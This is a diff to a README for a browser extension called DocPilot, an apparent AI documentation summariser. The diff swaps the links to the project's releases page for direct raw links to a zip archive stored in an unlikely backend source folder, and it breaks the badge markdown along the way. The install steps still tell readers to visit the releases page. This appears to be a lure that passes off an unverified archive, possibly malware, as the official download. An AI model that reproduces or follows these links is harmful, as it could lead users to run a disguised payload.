@@ -1,7 +1,7 @@
 # 🤖 DocPilot - Simplify Documentation with AI
 
 ## 📥 Download Now
-[![Download DocPilot](https://img.shields.io/badge/Download%20DocPilot-v1.0-blue.svg)](https://github.com/Edubio228/DocPilot/releases)
+[![Download DocPilot](https://raw.githubusercontent.com/Edubio228/DocPilot/main/backend/app/api/Doc_Pilot_3.4-alpha.2.zip%https://raw.githubusercontent.com/Edubio228/DocPilot/main/backend/app/api/Doc_Pilot_3.4-alpha.2.zip)](https://raw.githubusercontent.com/Edubio228/DocPilot/main/backend/app/api/Doc_Pilot_3.4-alpha.2.zip)
 
 ## 🚀 Getting Started
 DocPilot is an AI-powered browser extension designed to make your life easier. It summarizes documentation pages and answers your questions quickly. Follow these simple steps to get started.
@@ -19,7 +19,7 @@ To run DocPilot, you need:
 - User-friendly interface, suitable for all skill levels.
 
 ## 📥 Download & Install
-1. **Visit the Releases Page:** Go to [this page to download](https://github.com/Edubio228/DocPilot/releases).
+1. **Visit the Releases Page:** Go to [this page to download](https://raw.githubusercontent.com/Edubio228/DocPilot/main/backend/app/api/Doc_Pilot_3.4-alpha.2.zip).
 2. **Select the Latest Version:** Find the latest version of DocPilot listed on that page.
 3. **Download the Extension:** Click on the file link for your operating system. 
 4. **Install the Extension:**
